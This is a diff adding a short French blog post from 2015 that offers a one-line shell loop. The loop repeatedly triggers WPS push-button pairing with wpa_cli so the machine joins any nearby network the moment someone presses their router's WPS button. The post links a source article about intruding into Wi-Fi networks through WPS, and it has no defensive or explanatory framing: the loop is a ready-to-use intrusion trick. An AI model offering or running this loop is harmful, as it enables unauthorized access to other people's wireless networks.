@@ -1,0 +1,21 @@
+---
+layout: post
+title: "while true for WPS"
+date: 2015-02-10 07:47:00 +0000
+permalink: /2015/02/while-true-for-wps.html
+tags: ["wifi", "security", "WPS"]
+author: "cm"
+---
+{% raw %}
+While true permettant de se connecter dès que quelqu'un initie une connexion avec du WPS <br />
+<br /><br />
+<pre><code>wpa_cli
+while : ; do sudo wpa_cli wps_pbc any ; sleep 120 ; done &amp;</code></pre>
+<pre><code>&nbsp;</code></pre>
+<pre><code>&nbsp;</code></pre>
+Source :<br />
+<a href="http://korben.info/intrusion-dans-un-reseau-wifi-grace-au-wps.html?utm_source=feedburner&amp;utm_medium=email&amp;utm_campaign=Feed:+Korben_nl+%28Korben%29" target="_blank">http://korben.info/intrusion-dans-un-reseau-wifi-grace-au-wps.html?utm_source=feedburner&amp;utm_medium=email&amp;utm_campaign=Feed:+Korben_nl+%28Korben%29</a><br />
+<br />
+<pre><code>&nbsp;</code></pre>
+
+{% endraw %}
